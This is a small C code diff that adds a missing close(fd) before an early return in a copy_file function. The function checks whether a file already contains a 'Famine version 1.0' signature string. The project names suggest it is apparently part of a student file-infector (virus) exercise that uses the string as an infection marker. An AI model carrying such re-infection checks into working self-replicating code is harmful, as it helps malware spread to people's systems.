@@ -31,6 +31,7 @@ int copy_file(t_woody *woody, char *filename)
 	{
 		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 52) != NULL)
 		{
+			close(fd);
 			return ERROR_CODE;
 		}
 	}
